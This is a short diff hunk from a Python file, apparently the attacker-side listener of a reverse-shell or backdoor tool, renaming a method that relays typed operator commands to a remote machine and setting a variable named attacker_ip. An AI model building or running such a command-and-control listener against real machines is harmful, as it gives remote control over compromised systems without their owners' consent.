@@ -29,14 +29,14 @@ class Listener:
                 continue 
         return json_data
 
-    def execute_system_command(self, command):
+    def execute_remote_command(self, command):
         self.send(command)
         return self.receive()
 
     def run(self):
         while True:
             command = input('>> ')
-            result = self.execute_system_command(command)
+            result = self.execute_remote_command(command)
             print(result)
 
 attacker_ip = "192.168.106.129"
